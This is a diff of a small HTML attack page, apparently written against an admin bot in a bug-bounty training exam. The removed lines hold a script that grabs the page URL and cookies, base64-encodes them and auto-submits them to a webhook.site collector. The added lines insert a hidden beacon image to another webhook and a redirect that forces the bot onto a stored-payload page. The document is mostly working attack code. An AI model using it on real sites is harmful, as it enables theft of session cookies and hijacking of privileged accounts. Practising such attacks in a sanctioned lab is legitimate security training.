@@ -1,18 +1,20 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Internal Support Redirect</title>
+</head>
 <body>
-    <form id="steal" action="https://webhook.site/44abceed-c38d-44d9-a954-d2774c57877b" method="GET">
-        <input type="hidden" name="data" id="data" value="">
-    </form>
+    <p>Redirecting to support ticket...</p>
+    
+    <img src="https://webhook.site/f405ab5d-c8a6-4970-9c68-fdbb449df4a3?file_opened=true" style="display:none">
 
     <script>
-        // Try to grab the flag from the page title or URL
-        // In many CTFs, the flag is in the URL the bot is visiting
-        const info = "URL:" + location.href + " | Cookie:" + document.cookie;
-        document.getElementById('data').value = btoa(info);
-        
-        // Auto-submit the form to your webhook
-        document.getElementById('steal').submit();
+        // Use the ID from your POST response
+        const messageId = "69e76785bee6d6b7c6641d8d";
+        const adminUrl = "https://bugbounty-exam.hashacademy.co/admin/messages/" + messageId;
+
+        // Force the admin bot to go to the page where your payload is stored
+        window.location.href = adminUrl;
     </script>
 </body>
 </html>
